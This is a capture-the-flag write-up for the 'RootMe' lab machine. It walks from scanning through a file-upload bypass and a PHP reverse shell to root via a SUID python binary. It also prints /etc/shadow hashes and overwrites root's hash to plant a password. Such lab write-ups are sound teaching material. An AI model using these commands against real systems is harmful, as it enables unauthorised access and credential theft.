===RootMe	Flutter July 27 2021===


# Recon #


----------------
	Scanning
----------------

$ nmap -sV -sC -T5 -oN nmap_initial $IP

	'''
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
		http-cookie-flags: 
			/: 
				PHPSESSID: 
					httponly flag not set
		http-server-header: Apache/2.4.29 (Ubuntu)
		http-title: HackIT - Home
	'''
	
> running SSH

> using PHP

$ gobuster dir http://$IP -w directory-list-2.3-medium.txt -o gobuster_80

	'''
	/uploads (Status: 301)
	/css (Status: 301)
	/js (Status: 301)
	/panel (Status: 301)
	/server-status (Status: 403)
	'''

---------------------
	Visiting Site
---------------------

- not much value on home

- /panel dir
	> file upload page
    > trying PHP file
    
    	PHP não é permitido!

    
    > trying .php3, php4, php5, phtml

    	O arquivo foi upado com sucesso!


# Intrusion #

- uploading php-reverse-shell.php5 to /panel
	> courtesy of pentestmonkey <3

$ nc -lvnp 4443

- /uploads dir
	> running php-reverse-shell.php5

### Session caught on nc ###

$ id

	'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

- Stabalisation

		'''
		python -c 'import pty;pty.spawn("/bin/bash")'
		bash-4.4$ 
		CTRL Z
		stty raw -echo
		fg
		export TERM=xterm
		'''

bash-4.4$ ls -l /etc/passwd

> world readable

bash-4.4$ cat /etc/passwd
	
> Users

		root
		rootme
		test


# PrivEsc #

bash-4.4$ find / -type f -user root -perm -u=s 2>/dev/null

	'''
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/usr/lib/snapd/snap-confine
	/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/openssh/ssh-keysign
	/usr/lib/policykit-1/polkit-agent-helper-1
	/usr/bin/traceroute6.iputils
	/usr/bin/newuidmap
	/usr/bin/newgidmap
	/usr/bin/chsh
	/usr/bin/python
	/usr/bin/chfn
	/usr/bin/gpasswd
	/usr/bin/sudo
	/usr/bin/newgrp
	/usr/bin/passwd
	/usr/bin/pkexec
	/snap/core/8268/bin/mount
	/snap/core/8268/bin/ping
	/snap/core/8268/bin/ping6
	/snap/core/8268/bin/su
	/snap/core/8268/bin/umount
	/snap/core/8268/usr/bin/chfn
	/snap/core/8268/usr/bin/chsh
	/snap/core/8268/usr/bin/gpasswd
	/snap/core/8268/usr/bin/newgrp
	/snap/core/8268/usr/bin/passwd
	/snap/core/8268/usr/bin/sudo
	/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/snap/core/8268/usr/lib/openssh/ssh-keysign
	/snap/core/8268/usr/lib/snapd/snap-confine
	/snap/core/8268/usr/sbin/pppd
	/snap/core/9665/bin/mount
	/snap/core/9665/bin/ping
	/snap/core/9665/bin/ping6
	/snap/core/9665/bin/su
	/snap/core/9665/bin/umount
	/snap/core/9665/usr/bin/chfn
	/snap/core/9665/usr/bin/chsh
	/snap/core/9665/usr/bin/gpasswd
	/snap/core/9665/usr/bin/newgrp
	/snap/core/9665/usr/bin/passwd
	/snap/core/9665/usr/bin/sudo
	/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/snap/core/9665/usr/lib/openssh/ssh-keysign
	/snap/core/9665/usr/lib/snapd/snap-confine
	/snap/core/9665/usr/sbin/pppd
	/bin/mount
	/bin/su
	/bin/fusermount
	/bin/ping
	/bin/umount
	'''

> /usr/bin/python looks promising

bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

\# id

	'uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)'

	> root gained

\# find / -type f -name user.txt

	/var/www/user.txt

\# cat /var/www/user.txt
	
	Flag Found

\# find / -type f -name root.txt
	
	/root/root.txt

\# cat /root/root.txt

	Flag Found


# Okay, we've gotten all the flags for the challenge... but I'm not quite done #

Let's get those user hashes

\# cat /etc/shadow
	
	root:$6$5osB44J2$24WV3zAR1FTqEq3f2kSqrigUgyDmKucU8rwHvbOJWxIoWSlHbVHV1Ug1eOHqidieZWDU3Y5V3cimChun2JYNw1:18478:0:99999:7:::

	rootme:$6$jzeDDmrVeqMMEQqv$j8jwWy951YwWBJWzQNn.A45I.8H06/QOv4qocX.hNDdT42NytyavSHxlxoEh0ek2OS4NX27tuuZRTJuHPSWCp.:18478:0:99999:7:::

	test:$6$vXOyvOWZ$UpIjnJq/KuKmKHezW/pEM.nrI6QuqhWWlv/fUmLvJI1YG7nju2vpP3vg1Q0SSf5FCk8058WD5Rc3XXPMRlqHb0:18478:0:99999:7:::

> eh, we can crack them another time for fun, not necessary

$ mkpasswd -m sha-512 FlutterWasHere > newpass

	'$6$n0dYLiOE/DZ$6PzFKyQpxCEGIf3ZFHUITMYmMuVH6vYC7QECwuXLJJMLMRKOr5Tf.pEJQMfP22BE9ouZ.A5l1d8c9ctJZ6un3.'

\# nano /etc/shadow
	
> replace hash with our own

\# exit

bash-4.4$ su root

	Password: FlutterWasHere

root@rootme:/# id

	'uid=0(root) gid=0(root) groups=0(root)'

Mwahaha root is all ours now, and the shell is more responsive

### Getting rid of the SUID ###

root@rootme:/# chmod 755 /usr/bin/python

root@rootme:/# ls -l /usr/bin/python

	'-rwxr-xr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python'
